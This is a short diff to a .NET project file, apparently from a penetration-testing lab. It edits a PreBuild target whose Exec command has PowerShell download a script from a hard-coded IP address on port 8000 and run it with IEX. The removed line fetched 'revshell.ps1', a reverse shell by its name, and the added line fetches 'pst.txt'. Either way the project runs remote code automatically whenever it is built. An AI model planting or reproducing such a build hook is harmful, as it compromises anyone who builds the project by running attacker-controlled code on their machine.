@@ -7,6 +7,6 @@
     <Nullable>enable</Nullable>
   </PropertyGroup>
 <Target Name="PreBuild" BeforeTargets="PreBuildEvent">
-    <Exec Command="powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.14:8000/revshell.ps1')" />
+    <Exec Command="powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.14:8000/pst.txt')" />
   </Target>
 </Project>
